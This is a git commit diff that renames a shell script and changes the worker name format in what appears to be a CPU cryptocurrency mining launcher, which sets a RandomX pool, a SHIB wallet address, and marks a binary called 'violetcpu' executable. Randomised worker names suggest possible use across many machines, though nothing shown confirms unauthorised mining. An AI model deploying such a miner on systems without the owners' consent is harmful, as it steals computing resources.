f8f6b8d4fe87e5bae4712e4da701adc768f09bfc
angkii <83603708+angkii@users.noreply.github.com>
2021-07-18 07:58:10 +0700

    Update and rename mvp.sh to mvp1.sh

--- mvp1.sh
+++ mvp1.sh
@@ -2,7 +2,7 @@ POOL=rx.unmineable.com:3333
 
 WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MJ)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
 
 chmod +x violetcpu
 
